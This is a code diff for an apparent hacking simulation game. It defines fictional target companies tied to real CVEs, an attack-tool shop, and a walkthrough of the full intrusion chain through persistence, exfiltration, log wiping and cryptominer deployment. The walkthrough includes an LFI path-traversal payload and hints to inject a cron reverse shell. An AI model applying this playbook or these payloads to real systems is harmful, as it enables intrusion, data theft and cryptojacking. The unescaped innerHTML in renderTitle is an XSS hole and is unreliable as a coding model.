+     {id:'pf-c3',title:'Harvest Backup Creds',desc:'Exfiltrate /home/backup/creds.bak',target:'/home/backup/creds.bak',reward:{c:200,r:40}},
+   ]
+  },
+  {id:'c1', name:'NexGenPharm Research', domain:'ngpharma.net', ip:'10.0.5.22',
+   industry:'Pharmaceutical R&D',
+   desc:'Mid-size drug research org. IDS + WAF active. Multiple entry vectors.',
+   diff:'med', repReq:200,
+   sec:{fw:true,ids:true,mfa:false,waf:true},
+   scanReq:{nmap:true,gobuster:true,sniffer:true},
+   ports:[
+     {num:443,svc:'HTTPS',ver:'nginx/1.14.2',vuln:'CVE-2021-22144',note:'Kibana SSRF'},
+     {num:22,svc:'SSH',ver:'OpenSSH 8.1p1',vuln:'user-enum',note:'Timing enum'},
+     {num:8009,svc:'AJP',ver:'Tomcat/9.0.1',vuln:'CVE-2020-1938',note:'Ghostcat file read/RCE'},
+     {num:5432,svc:'PgSQL',ver:'PostgreSQL 12.1',vuln:'weak-creds',note:'dev:dev123'},
+     {num:6379,svc:'Redis',ver:'Redis 6.0.3',vuln:'unauth-redis',note:'No authentication'},
+   ],
+   creds:{'dev.ops':'DevOps2021!','dev':'dev123'},
+   rootMethod:'SUID /usr/local/bin/pharmactl calls execve("/bin/sh") giving root',
+   webVulns:['sqli','lfi','csrf'],
+   fs:{
+     '/':['etc','home','opt','var','tmp','root'],
+     '/etc':['passwd','hosts'],
+     '/home':['dev.ops','dr.yamamoto'],
+     '/home/dev.ops':['build_notes.txt','.ssh'],
+     '/home/dev.ops/.ssh':['authorized_keys','id_rsa'],
+     '/home/dr.yamamoto':['meeting_notes.txt'],
+     '/opt':['pharmactl','tomcat'],
+     '/opt/tomcat':['conf','webapps'],
+     '/opt/tomcat/conf':['tomcat-users.xml','server.xml'],
+     '/root':['flag.txt'],'/tmp':[],
+   },
+   fc:{
+     '/home/dev.ops/build_notes.txt':'AJP connector left enabled (TICKET-2847)\nDB: dev/dev123 on PostgreSQL\npharmactl SUID -- IT says intentional\nKibana SSRF (TICKET-3011)',
+     '/opt/tomcat/conf/tomcat-users.xml':'<?xml version="1.0"?>\n<tomcat-users>\n  <user username="tomcat-mgr" password="Tomcat$Mgr2021" roles="manager-gui,manager-script"/>\n  <user username="deployer"   password="Deploy#Auto99"  roles="manager-script"/>\n</tomcat-users>',
+     '/home/dr.yamamoto/meeting_notes.txt':'Meeting 2024-01-15\n- NGP-447 trial results positive\n- IT audit flagged AJP issue\n- pharmactl SUID flagged too',
+     '/etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndev.ops:x:1001:1001::/home/dev.ops:/bin/bash\ndr.yamamoto:x:1002:1002::/home/dr.yamamoto:/bin/bash',
+     '/root/flag.txt':'NETBREAKER{NGP_PHARM_PWNED}\n\nRoot on NexGenPharm confirmed.',
+   },
+   site:{pages:['home','pipeline','careers','contact','portal']},
+   contracts:[
+     {id:'ng-c1',title:'Ghostcat File Read',desc:'CVE-2020-1938 read /opt/tomcat/conf/tomcat-users.xml',target:'/opt/tomcat/conf/tomcat-users.xml',reward:{c:600,r:100}},
+     {id:'ng-c2',title:'Root the Pharma Box',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:2500,r:400}},
+   ]
+  },
+  {id:'c2', name:'Arclight Financial Group', domain:'arclightfg.com', ip:'172.16.5.100',
+   industry:'Investment Banking',
+   desc:'Hardened financial institution. WAF + IDS + MFA. Segmented zones.',
+   diff:'hard', repReq:600,
+   sec:{fw:true,ids:true,mfa:true,waf:true},
+   scanReq:{nmap:true,gobuster:true,sniffer:true},
+   ports:[
+     {num:443,svc:'HTTPS',ver:'F5 BIG-IP 15.1.2',vuln:'CVE-2022-1388',note:'iControl REST auth bypass'},
+     {num:8443,svc:'Kibana',ver:'Kibana 7.12.0',vuln:'CVE-2021-22144',note:'SSRF to internal ES'},
+     {num:9200,svc:'Elastic',ver:'ES 7.12.0',vuln:'unauth-elastic',note:'Accessible from Kibana subnet'},
+     {num:3389,svc:'RDP',ver:'Win Server 2019',vuln:'BlueKeep-sim',note:'Internal RDP post-pivot'},
+     {num:22,svc:'SSH',ver:'OpenSSH 8.9p1',vuln:'none',note:'Hardened'},
+   ],
+   creds:{'svc.monitor':'M0n1tor$2023'},
+   rootMethod:'SeImpersonatePrivilege then SYSTEM via token impersonation',
+   webVulns:['idor','csrf','auth-bypass'],
+   fs:{
+     '/':['C:'],'/C:':['Users','Logs','Program Files'],
+     '/C:/Users':['Administrator','svc.monitor'],
+     '/C:/Users/Administrator':['Desktop'],
+     '/C:/Users/Administrator/Desktop':['flag.txt','arclight_keys.xlsx'],
+     '/C:/Logs':['kibana.log','elastic.log'],
+   },
+   fc:{
+     '/C:/Users/Administrator/Desktop/flag.txt':'NETBREAKER{ARC_F1N_SYS73M_0WN3D}\n\nSYSTEM on Arclight Financial Group.',
+     '/C:/Logs/kibana.log':'[09:13] WARN  Elasticsearch: no TLS, no auth on internal cluster\n[09:45] ERROR SSRF attempt blocked by WAF\n[10:02] INFO  elastic.admin authenticated',
+   },
+   site:{pages:['home','about','services','compliance','contact','portal']},
+   contracts:[
+     {id:'af-c1',title:'Elastic Data Exfil',desc:'Access Elasticsearch via Kibana SSRF.',target:'elastic_dump',reward:{c:2000,r:300}},
+     {id:'af-c2',title:'Domain Admin Flag',desc:'Exfil /C:/Users/Administrator/Desktop/flag.txt',target:'/C:/Users/Administrator/Desktop/flag.txt',reward:{c:8000,r:1200}},
+   ]
+  },
+  {id:'c3', name:'CivicGrid Power Authority', domain:'civicgrid.ics', ip:'10.10.1.5',
+   industry:'Critical Infrastructure / ICS-SCADA',
+   desc:'Power grid control system. Modbus, S7comm, DNP3. Extreme hardening.',
+   diff:'elite', repReq:1800,
+   sec:{fw:true,ids:true,mfa:true,waf:true},
+   scanReq:{nmap:true,gobuster:true,sniffer:true},
+   ports:[
+     {num:102,svc:'S7comm',ver:'Siemens S7-1500',vuln:'S7-auth-bypass',note:'Legacy auth bypass'},
+     {num:502,svc:'Modbus',ver:'Schneider Modicon M340',vuln:'modbus-no-auth',note:'No authentication'},
+     {num:20000,svc:'DNP3',ver:'GE Grid Solutions',vuln:'dnp3-replay',note:'No sequence numbers'},
+     {num:443,svc:'HTTPS',ver:'IIS 10.0',vuln:'CVE-2022-21907-sim',note:'HTTP Stack RCE (sim)'},
+   ],
+   creds:{'scada.ops':'Gr1dOps$2023'},
+   rootMethod:'S7comm auth bypass then PLC register write then HMI admin then root',
+   webVulns:['auth-bypass','idor'],
+   fs:{
+     '/':['opt','home','root','etc'],
+     '/opt':['scada','hmi'],
+     '/opt/scada':['plc_map.cfg','alarms.log','config.xml'],
+     '/home':['scada.ops'],'/home/scada.ops':['shift_notes.txt'],
+     '/root':['flag.txt','grid_topology.pdf'],
+     '/etc':['passwd','modbus.conf'],
+   },
+   fc:{
+     '/root/flag.txt':'NETBREAKER{C1V1C_GR1D_3L1T3_PWN3D}\n\nCritical infrastructure compromised.\nHighest tier in NETBREAKER.',
+     '/opt/scada/plc_map.cfg':'[PLC_MAP v2.3]\nPLC_001 = 192.168.100.10 : Substation_Alpha\nPLC_002 = 192.168.100.11 : Substation_Beta\n\n[AUTH]\nmode = legacy_compat\nbypass_allowed = true',
+     '/home/scada.ops/shift_notes.txt':'Shift log 2024-01-15\n-- S7comm legacy mode still active (IT ticket 8821)\n-- HMI admin password on sticky note in server room',
+     '/etc/modbus.conf':'[MODBUS_SERVER]\nauth_required = false\nlog_requests = false',
+   },
+   site:{pages:['home','operations','about','contact','portal']},
+   contracts:[
+     {id:'cg-c1',title:'Exfil PLC Map',desc:'Retrieve /opt/scada/plc_map.cfg',target:'/opt/scada/plc_map.cfg',reward:{c:4000,r:700}},
+     {id:'cg-c2',title:'ICS Elite Root Flag',desc:'Full compromise /root/flag.txt',target:'/root/flag.txt',reward:{c:25000,r:6000}},
+   ]
+  }
+
+  
+  ,{id:'c4', name:'Darkpeak Analytics', domain:'darkpeak.io', ip:'10.20.5.50',
+   industry:'Data Broker / Analytics',
+   desc:'Shadow data broker. Sells consumer profiles. Lightly defended but valuable data.',
+   diff:'med', repReq:500,
+   sec:{fw:true,ids:false,mfa:false,waf:false},
+   scanReq:{nmap:true,gobuster:false,sniffer:false},
+   ports:[
+     {num:22,svc:'SSH',ver:'OpenSSH 7.9p1',vuln:'CVE-2016-0777',note:'User enum'},
+     {num:80,svc:'HTTP',ver:'Apache/2.4.38',vuln:'CVE-2017-7679',note:'mod_mime overflow'},
+     {num:27017,svc:'MongoDB',ver:'MongoDB 3.4.23',vuln:'unauth-mongo',note:'No auth, exposed publicly'},
+     {num:9200,svc:'Elastic',ver:'ES 6.8.0',vuln:'unauth-elastic',note:'No auth, contains consumer PII'},
+   ],
+   creds:{'deploy':'Deploy#2022!','admin':'darkpeak123'},
+   rootMethod:'Writable /etc/cron.d as deploy user: inject root reverse shell',
+   webVulns:['idor','sqli'],
+   fs:{
+     '/':['etc','home','var','root','opt'],
+     '/etc':['passwd','crontab','cron.d'],
+     '/etc/cron.d':['darkpeak-backup','darkpeak-sync'],
+     '/home':['deploy','admin'],
+     '/home/deploy':['sync.sh','notes.txt'],
+     '/home/admin':['db_dump.sh'],
+     '/opt':['darkpeak'],'/opt/darkpeak':['api.js','config.json'],
+     '/root':['flag.txt'],'/var':['log'],
+   },
+   fc:{
+     '/home/deploy/notes.txt':'MongoDB on port 27017 -- auth disabled for dev, TODO fix\nElastic also open -- holds consumer_profiles (~14M records)\nDeploy user can write to /etc/cron.d (needed for deploy scripts)',
+     '/opt/darkpeak/config.json':'{"db":"mongodb://localhost:27017/darkpeak","elastic":"http://localhost:9200","admin_user":"admin","admin_pass":"darkpeak123"}',
+     '/root/flag.txt':'NETBREAKER{DARKPEAK_DAT4_BR0K3R_0WN3D}\n\nDarkpeak Analytics rooted.\nConsumer profile database accessible.',
+   },
+   site:{pages:['home','about','services','contact','portal']},
+   contracts:[
+     {id:'dp-c1',title:'MongoDB Data Dump',desc:'Exploit unauthenticated MongoDB on 27017.',target:'mongo_dump',reward:{c:1200,r:180}},
+     {id:'dp-c2',title:'Root Darkpeak',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:3000,r:500}},
+   ]
+  }
+  ,{id:'c5', name:'OmniCloud Hosting', domain:'omnicloud.net', ip:'185.14.6.88',
+   industry:'Cloud VPS / Hosting Provider',
+   desc:'Offshore VPS provider. Hosts hundreds of tenants. Root here = tenant management access.',
+   diff:'hard', repReq:1000,
+   sec:{fw:true,ids:true,mfa:false,waf:true},
+   scanReq:{nmap:true,gobuster:true,sniffer:true},
+   ports:[
+     {num:443,svc:'HTTPS',ver:'nginx/1.18.0',vuln:'CVE-2021-22144',note:'Kibana SSRF in mgmt panel'},
+     {num:22,svc:'SSH',ver:'OpenSSH 8.2p1',vuln:'user-enum',note:'Timing enum'},
+     {num:2222,svc:'SSH-mgmt',ver:'OpenSSH 7.4p1',vuln:'CVE-2016-0777',note:'Management SSH, legacy'},
+     {num:8080,svc:'HTTP',ver:'Jetty/9.4.35',vuln:'CVE-2020-1938',note:'AJP connector exposed'},
+     {num:4567,svc:'Sinatra',ver:'Sinatra 2.1.0',vuln:'weak-creds',note:'Tenant API: admin:admin'},
+   ],
+   creds:{'sysadmin':'OmniSys$2021','admin':'admin'},
+   rootMethod:'sudo -l shows NOPASSWD: /usr/sbin/service -- service binary exploit to root',
+   webVulns:['sqli','lfi','idor'],
+   fs:{
+     '/':['etc','home','var','root','opt','srv'],
+     '/etc':['passwd','shadow','hosts','sudoers'],
+     '/home':['sysadmin','billing'],
+     '/home/sysadmin':['tenant_list.txt','.ssh','mgmt.sh'],
+     '/home/sysadmin/.ssh':['authorized_keys','id_rsa'],
+     '/opt':['omnicloud'],'/opt/omnicloud':['tenants.db','billing.conf'],
+     '/root':['flag.txt','master_key.pem'],
+     '/srv':['tenants'],
+   },
+   fc:{
+     '/home/sysadmin/tenant_list.txt':'TENANT ROSTER (confidential)\ntenant_001: cryptomine.xyz  -- VPS Pro\ntenant_002: darksite.onion -- VPS Ultra\ntenant_003: botnet-ctrl.ru -- flagged pending review\n192.168.200.0/24 -- internal tenant VLAN',
+     '/opt/omnicloud/billing.conf':'db_host=localhost\ndb_pass=Billing$Omni2022\nadmin_api=http://localhost:4567\napi_key=sk_omni_9f3kL2mNxP\nroot_ssh_key=/root/master_key.pem',
+     '/root/flag.txt':'NETBREAKER{0MN1CL0UD_H0ST_PWN3D}\n\nOmniCloud Hosting root obtained.\nTenant VPS management accessible.',
+     '/root/master_key.pem':'-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA[SIMULATION -- master tenant key]\n-----END RSA PRIVATE KEY-----',
+   },
+   site:{pages:['home','plans','support','datacenter','contact','portal']},
+   contracts:[
+     {id:'oc-c1',title:'Tenant Roster Exfil',desc:'Retrieve /home/sysadmin/tenant_list.txt',target:'/home/sysadmin/tenant_list.txt',reward:{c:2000,r:300}},
+     {id:'oc-c2',title:'Root OmniCloud',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:6000,r:900}},
+     {id:'oc-c3',title:'Master Key',desc:'Exfil /root/master_key.pem',target:'/root/master_key.pem',reward:{c:4000,r:500}},
+   ]
+  }
+  ,{id:'c6', name:'Sentinel Defense Systems', domain:'sentinel-ds.com', ip:'172.31.10.5',
+   industry:'Defense Contractor',
+   desc:'Private defense contractor. Classified project data. Nation-state hardening.',
+   diff:'elite', repReq:3500,
+   sec:{fw:true,ids:true,mfa:true,waf:true},
+   scanReq:{nmap:true,gobuster:true,sniffer:true},
+   ports:[
+     {num:443,svc:'HTTPS',ver:'F5 BIG-IP 16.0.1',vuln:'CVE-2022-1388',note:'iControl auth bypass'},
+     {num:8443,svc:'Kibana',ver:'Kibana 7.11.0',vuln:'CVE-2021-22144',note:'SSRF to internal ES'},
+     {num:636,svc:'LDAPS',ver:'OpenLDAP 2.4.57',vuln:'LDAP-injection',note:'Search filter injection'},
+     {num:1433,svc:'MSSQL',ver:'SQL Server 2019',vuln:'weak-creds',note:'sa:Sent1nel2019 via sniffer'},
+     {num:22,svc:'SSH',ver:'OpenSSH 8.4p1',vuln:'none',note:'Fully hardened, key only'},
+   ],
+   creds:{'svc.backup':'Sent1nel2019','sa':'Sent1nel2019'},
+   rootMethod:'MSSQL xp_cmdshell via sa account then SeImpersonatePrivilege to SYSTEM',
+   webVulns:['auth-bypass','idor','csrf'],
+   fs:{
+     '/':['C:'],'/C:':['Users','Projects','Logs','Windows'],
+     '/C:/Users':['Administrator','svc.backup'],
+     '/C:/Users/Administrator':['Desktop','Documents'],
+     '/C:/Users/Administrator/Desktop':['flag.txt','CLASSIFIED_SUMMARY.pdf','encryption_keys.txt'],
+     '/C:/Projects':['IRONCLAD','PHANTOM_NET','DARKSTAR'],
+     '/C:/Projects/IRONCLAD':['specs.enc','budget.xlsx','contacts.txt'],
+     '/C:/Logs':['mssql.log','ids.log'],
+   },
+   fc:{
+     '/C:/Users/Administrator/Desktop/flag.txt':'NETBREAKER{S3NT1N3L_CL4SS1F13D_PWN3D}\n\nSentinel Defense fully compromised.',
+     '/C:/Projects/IRONCLAD/contacts.txt':'Project IRONCLAD\nProgram Director: Gen. Wallace\nClearance: TOP SECRET / SCI\nBudget: $847M',
+     '/C:/Logs/mssql.log':'2024-01-15 09:01 Login: sa from 172.31.10.50\n2024-01-15 09:44 xp_cmdshell enabled by sa\n2024-01-15 14:22 ALERT: IDS C2 beacon pattern',
+   },
+   site:{pages:['home','about','contracts','careers','contact','portal']},
+   contracts:[
+     {id:'sd-c1',title:'IRONCLAD Project Data',desc:'Exfil /C:/Projects/IRONCLAD/contacts.txt',target:'/C:/Projects/IRONCLAD/contacts.txt',reward:{c:12000,r:2000}},
+     {id:'sd-c2',title:'Sentinel Root Flag',desc:'Full compromise /C:/Users/Administrator/Desktop/flag.txt',target:'/C:/Users/Administrator/Desktop/flag.txt',reward:{c:30000,r:5000}},
+   ]
+  }
+
+];
+
+var SHOP = [
+  {id:'netcat',     icon:'\uD83D\uDD17', name:'netcat',        cat:'network', desc:'TCP/UDP tool. Reverse shells, port scan, file transfer.',  cost:{c:0,r:0},    cmds:['nc <ip> <port>','nc -lvnp <port>']},
+  {id:'nmap-adv',   icon:'\uD83D\uDCE1', name:'nmap advanced', cat:'recon',   desc:'OS detect, scripting, full version scan.',                 cost:{c:0,r:0},    cmds:['nmap -sV -sC -O <ip>']},
+  {id:'gobuster',   icon:'\uD83D\uDD0D', name:'gobuster',      cat:'recon',   desc:'Web directory brute-forcer. Finds hidden paths.',          cost:{c:100,r:0},  cmds:['gobuster <ip>']},
+  {id:'hydra',      icon:'\uD83D\uDD11', name:'hydra',         cat:'exploit', desc:'Network login brute-forcer. SSH, FTP, HTTP.',              cost:{c:150,r:0},  cmds:['brute ssh <ip>','brute ftp <ip>']},
+  {id:'sqlmap',     icon:'\uD83D\uDC89', name:'sqlmap',        cat:'webexpl', desc:'Automated SQL injection scanner.',                         cost:{c:200,r:0}, cmds:['exploit sqli <ip>']},
+  {id:'metasploit', icon:'\uD83D\uDC80', name:'Metasploit',    cat:'exploit', desc:'Exploit framework. Unlocks all CVE-based exploitation.',   cost:{c:300,r:50},cmds:['exploit <CVE> <ip>']},
+  {id:'metasploit-pro',icon:'\u2620', name:'Metasploit Pro',   cat:'exploit', desc:'Post-exploit. Token impersonation, pivoting.',             cost:{c:2500,r:400},cmds:['privesc token','pivot <src> <dst>']},
+  {id:'linpeas',    icon:'\uD83D\uDC27', name:'linPEAS',       cat:'post',    desc:'Linux PrivEsc auto-scanner. Finds sudo, SUID, cron.',     cost:{c:400,r:80}, cmds:['privesc linpeas']},
+  {id:'mimikatz',   icon:'\uD83E\uDDE0', name:'mimikatz',      cat:'post',    desc:'Windows credential harvesting from LSASS.',               cost:{c:1800,r:300},cmds:['privesc mimikatz']},
+  {id:'burpsuite',  icon:'\uD83D\uDD75', name:'Burp Suite',    cat:'webexpl', desc:'Web proxy. Use INTERCEPT button in Browser pane.',        cost:{c:800,r:150},cmds:['INTERCEPT in browser pane']},
+  {id:'crontab-kit',icon:'\u23F0', name:'Persistence Kit',     cat:'persist', desc:'Cron, SSH backdoor, systemd service.',                    cost:{c:700,r:120},cmds:['persist cron','persist backdoor']},
+  {id:'exfil-kit',  icon:'\uD83D\uDCE4', name:'Exfil Toolkit', cat:'exfil',   desc:'Encrypted DNS/HTTPS covert channel.',                    cost:{c:900,r:180},cmds:['exfil <path> dns','exfil <path> https']},
+  {id:'vpn-chain',  icon:'\uD83C\uDF10', name:'VPN Chain',     cat:'opsec',   desc:'3-hop proxy. Reduces wanted gain by 60%.',               cost:{c:1200,r:200},cmds:['[Passive]']},
+  {id:'tor',        icon:'\uD83E\uDDC5', name:'TOR Router',    cat:'opsec',   desc:'Full TOR. Near-untraceable. Required for elite targets.',cost:{c:3500,r:700},cmds:['[Passive]']},
+  {id:'log-cleaner', icon:'\uD83E\uDDF9', name:'Log Cleaner',  cat:'opsec',   desc:'Wipes auth.log, system logs, bash history on target. Resets wanted level.',cost:{c:800,r:0},  cmds:['clearlogs','clearlogs <ip>']},
+  {id:'ip-rotator',  icon:'\uD83D\uDD04', name:'IP Rotator',   cat:'opsec',   desc:'Rotates attacker IP via proxy chain. Breaks active traces. Wanted -2.',    cost:{c:1500,r:150},cmds:['rotateip']},
+  {id:'miner',       icon:'\u26CF',  name:'XMR Miner',          cat:'mining',  desc:'Deploys a Monero miner on a rooted target. Generates passive credits.',   cost:{c:500,r:50}, cmds:['deploy miner <ip>','miners']},
+  {id:'miner-pool',  icon:'\uD83D\uDCE1', name:'Mining Pool',  cat:'mining',  desc:'Connects all miners to optimized pool. Doubles miner output.',            cost:{c:2000,r:200},cmds:['deploy miner <ip>','miners']},
+];
+
+var WALKTHROUGH = [
+  'NETBREAKER OPERATOR WALKTHROUGH',
+  'SPOILER WARNING -- read only if stuck',
+  '',
+  'All targets and exploits are FICTIONAL simulations.',
+  'Based on CompTIA Security+ / PenTest+ methodology.',
+  '',
+  'GENERAL SEQUENCE:',
+  '  1. scan <subnet>         Discover live hosts',
+  '  2. nmap -sV -sC <ip>    Identify services and CVEs',
+  '  3. deploy sniffer <ip>  Capture creds passively',
+  '  4. gobuster <ip>        Find hidden web paths',
+  '  5. exploit <CVE> <ip>   Gain initial shell',
+  '  6. privesc linpeas      Escalate to root',
+  '  7. persist cron         Install persistence',
+  '  8. exfil <file> https   Exfiltrate and complete contract',
+  '',
+  'TARGET 1: PetroFlow (192.168.10.14) -- EASY',
+  'No recon gating. No IDS.',
+  '',
+  '  $ scan 192.168.10.0/24',
+  '  $ nmap -sV -sC 192.168.10.14',
+  '    > FTP/21: vsftpd 2.3.4 (backdoor)',
+  '    > HTTP/80: Apache 2.2.34 (CVE-2017-7679)',
+  '  $ deploy sniffer 192.168.10.14',
+  '    > Captures: marcus.reed / Pipeline2019!',
+  '  $ gobuster 192.168.10.14',
+  '    > /login.php /config.php /api/users.php',
+  '',
+  '  Option A -- FTP backdoor (fastest, gets root):',
+  '    $ exploit vsftpd-backdoor 192.168.10.14',
+  '    > Root bind shell on port 6200',
+  '',
+  '  Option B -- Apache CVE:',
+  '    $ exploit CVE-2017-7679 192.168.10.14',
+  '    > www-data shell then privesc linpeas then privesc sudo',
+  '',
+  '  Option C -- SSH with sniffer creds:',
+  '    $ ssh marcus.reed@192.168.10.14',
+  '    > privesc sudo then sudo /bin/bash then root',
+  '',
+  '  Contracts:',
+  '    $ exfil /root/flag.txt https         +800c +150rep',
+  '    $ exfil /var/www/html/config.php https  +300c +60rep',
+  '    $ exfil /home/backup/creds.bak https    +200c +40rep',
+  '',
+  'TARGET 2: NexGenPharm (10.0.5.22) -- MEDIUM',
+  'Requires 200 REP. nmap + gobuster + sniffer required.',
+  '',
+  '  $ scan 10.0.0.0/24',
+  '  $ nmap -sV -sC 10.0.5.22',
+  '    > AJP/8009: CVE-2020-1938 (Ghostcat)',
+  '  $ gobuster 10.0.5.22',
+  '  $ deploy sniffer 10.0.5.22',
+  '    > Captures: dev.ops / DevOps2021!',
+  '  $ exploit CVE-2020-1938 10.0.5.22',
+  '    > Reads tomcat-users.xml',
+  '  $ privesc linpeas  -- finds pharmactl SUID',
+  '  $ privesc suid  -- root shell',
+  '  $ exfil /root/flag.txt dns  (IDS active, use covert)',
+  '',
+  'TARGET 3: Arclight Financial (172.16.5.100) -- HARD',
+  'Requires 600 REP + metasploit-pro.',
+  '',
+  '  $ scan 172.16.0.0/24',
+  '  $ nmap -sV -sC 172.16.5.100',
+  '    > F5 BIG-IP: CVE-2022-1388',
+  '    > Kibana 7.12: CVE-2021-22144',
+  '  $ gobuster + sniffer required',
+  '  $ exploit CVE-2022-1388 172.16.5.100  -- root on BIG-IP',
+  '  $ exploit CVE-2021-22144 172.16.5.100 -- dumps ES indices',
+  '  $ pivot 172.16.5.100 192.168.5.10  -- Windows RDP',
+  '  $ privesc token  -- SYSTEM',
+  '  $ exfil /C:/Users/Administrator/Desktop/flag.txt https',
+  '',
+  'TARGET 4: CivicGrid Power (10.10.1.5) -- ELITE',
+  'Requires 1800 REP + TOR + metasploit-pro.',
+  '',
+  '  $ scan 10.10.0.0/24',
+  '  $ nmap -sV -sC -p 102,502,20000 10.10.1.5',
+  '    > S7comm/102: S7-auth-bypass',
+  '    > Modbus/502: no auth',
+  '  $ gobuster + sniffer required',
+  '  $ exploit S7-auth-bypass 10.10.1.5  -- PLC then HMI',
+  '  $ privesc hmi-admin  -- root',
+  '  $ exfil /root/flag.txt dns',
+  '',
+  'WEB APP GUIDE:',
+  '  SQLi: exploit sqli <ip>  or  login form: inject in username',
+  '  XSS:  exploit xss <ip>   or  search: inject script payload',
+  '  IDOR: exploit idor <ip>  or  /api/users.php?id=2',
+  '  LFI:  exploit lfi <ip>   or  ?page=../../../etc/passwd',
+  '  CSRF: exploit csrf <ip>  or  INTERCEPT -- check for token',
+  '  Use FUZZER in browser pane to auto-test all input fields.',
+  '',
+  '',
+  'OPSEC GUIDE:',
+  '  Wanted level rises with noisy actions (exploits on IDS targets, brute force, HTTP exfil).',
+  '  Reduce wanted:',
+  '    clearlogs <ip>    Wipe target logs (-2 wanted). Requires log-cleaner tool.',
+  '    rotateip          Rotate attacker IP (-2 wanted). Requires ip-rotator tool.',
+  '    TOR Router        Prevents wanted gain entirely (passive). Best long-term.',
+  '    VPN Chain         Reduces wanted gain rate by 60% (passive).',
+  '    Time              Wanted decays automatically over time.',
+  '',
+  'MINING GUIDE:',
+  '  1. Root a target (any target)',
+  '  2. Buy XMR Miner from shop (₿500)',
+  '  3. deploy miner <ip>',
+  '  4. Miner pays ₿8-80 every 30 seconds depending on target tier',
+  '  5. Buy Mining Pool (₿2000) to double all miner rates',
+  '  6. "miners" command shows all active rigs and total income',
+  '  Mining rates by tier:',
+  '    easy  = ₿8/tick (e.g. PetroFlow)',
+  '    med   = ₿18/tick (NexGenPharm, Darkpeak)',
+  '    hard  = ₿35/tick (Arclight, OmniCloud)',
+  '    elite = ₿80/tick (CivicGrid, Sentinel)',
+  '',
+  'TARGET 5: Darkpeak Analytics (10.20.5.50) -- MEDIUM',
+  'Requires 500 REP. nmap required.',
+  '',
+  '  $ scan 10.20.5.0/24',
+  '  $ nmap -sV -sC 10.20.5.50',
+  '    > HTTP/80: Apache 2.4.38 (CVE-2017-7679)',
+  '    > MongoDB/27017: unauthenticated',
+  '    > Elastic/9200: unauthenticated (consumer PII)',
+  '  $ exploit CVE-2017-7679 10.20.5.50  -- www-data shell',
+  '  $ privesc linpeas  -- writable /etc/cron.d',
+  '  $ privesc cron  -- root shell',
+  '  $ deploy miner 10.20.5.50  -- ₿18/tick passive income',
+  '  $ exfil /root/flag.txt https',
+  '',
+  'TARGET 6: OmniCloud Hosting (185.14.6.88) -- HARD',
+  'Requires 1000 REP. Full recon required.',
+  '',
+  '  $ scan 185.14.0.0/24',
+  '  $ nmap -sV -sC 185.14.6.88',
+  '    > HTTPS/443: Kibana SSRF (CVE-2021-22144)',
+  '    > SSH-mgmt/2222: CVE-2016-0777',
+  '    > Jetty/8080: Ghostcat AJP (CVE-2020-1938)',
+  '  $ gobuster 185.14.6.88 + deploy sniffer 185.14.6.88',
+  '  $ exploit CVE-2020-1938 185.14.6.88  -- file read tomcat-users.xml',
+  '  $ privesc sudo  -- service exploit to root',
+  '  $ deploy miner 185.14.6.88  -- ₿35/tick',
+  '  $ exfil /home/sysadmin/tenant_list.txt https',
+  '  $ exfil /root/flag.txt https',
+  '  $ exfil /root/master_key.pem https',
+  '',
+  'TARGET 7: Sentinel Defense (172.31.10.5) -- ELITE',
+  'Requires 3500 REP. TOR + metasploit-pro required.',
+  '',
+  '  $ scan 172.31.0.0/24',
+  '  $ nmap -sV -sC 172.31.10.5',
+  '    > HTTPS/443: F5 BIG-IP (CVE-2022-1388)',
+  '    > Kibana/8443: SSRF (CVE-2021-22144)',
+  '    > MSSQL/1433: sa:Sent1nel2019 (found via sniffer)',
+  '  $ gobuster + sniffer required',
+  '  $ exploit CVE-2022-1388 172.31.10.5  -- root on BIG-IP',
+  '  $ exploit CVE-2021-22144 172.31.10.5  -- ES data dump',
+  '  $ privesc token  -- SYSTEM via MSSQL xp_cmdshell',
+  '  $ deploy miner 172.31.10.5  -- ₿80/tick',
+  '  $ exfil /C:/Users/Administrator/Desktop/flag.txt https',
+  '  $ exfil /C:/Projects/IRONCLAD/contacts.txt https',
+  '',
+  'CREDIT FLOW:',
+  '  Scan discovers host: +₿10/host',
+  '  Nmap finds vulns:    +₿15/vuln',
+  '  Gobuster success:    +₿20',
+  '  Sniffer deployed:    +₿30',
+  '  SSH login:           +₿50',
+  '  Web login:           +₿40',
+  '  Exploit success:     +₿75',
+  '  Root shell:          +₿150',
+  '  Privesc:             +₿100',
+  '  Contracts:           +₿200-30000',
+  '  Mining (per tick):   +₿8-80 every 30s',
+  '',
+  'END OF WALKTHROUGH'
+].join('\n');
+
+// ═══════════════════════════ GAME STATE ═══════════════════════════
+var G = null;
+
+function defaultState(handle) {
+  var contracts = {};
+  COMPANIES.forEach(function(co) {
+    (co.contracts || []).forEach(function(ct) {
+      contracts[ct.id] = (co.repReq === 0) ? 'active' : 'inactive';
+    });
+  });
+  return {
+    handle:handle, credits:0, rep:0, wanted:0, miners:{}, minerIncome:0,
+    tools:['netcat','nmap-adv'], scripts:[], agents:{}, pwned:{},
+    session:{connected:false, targetId:null, user:null, cwd:'/', isRoot:false},
+    contracts:contracts, discovered:['c0'], reconDone:{},
+    interceptMode:false, created:Date.now(), lastSaved:Date.now()
+  };
+}
+
+function saveGame() { if (!G) return; G.lastSaved = Date.now(); dbPut(G); }
+
+// ═══════════════════════════ TITLE ═══════════════════════════
+function renderTitle() {
+  dbGetAll(function(saves) {
+    var el = document.getElementById('char-grid');
+    var html = '';
+    saves.forEach(function(s) {
+      html += '<div class="char-slot" data-handle="' + s.handle + '">' +
+        '<div class="slot-avatar">\uD83D\uDCBB</div>' +
+        '<div class="slot-handle">' + s.handle + '</div>' +
+        '<div class="slot-info">\u20BF' + s.credits + ' \u00B7 ' + s.rep + ' REP<br>' + new Date(s.lastSaved).toLocaleDateString() + '</div>' +
+        '<span class="slot-del" data-del="' + s.handle + '">[ DELETE ]</span></div>';
+    });
+    for (var i = saves.length; i < 3; i++) {
+      html += '<div class="char-slot new-slot">' +
+        '<div class="slot-avatar" style="color:var(--textd)">?</div>' +
+        '<div style="color:var(--textd);font-size:10px">[ EMPTY SLOT ]</div>' +
+        '<div style="font-size:9px;color:var(--textdd);margin-top:5px">tap to create</div></div>';
+    }
+    el.innerHTML = html;
+  });
+}
+
+function showNewChar() {
+  document.getElementById('new-char-panel').style.display = 'block';
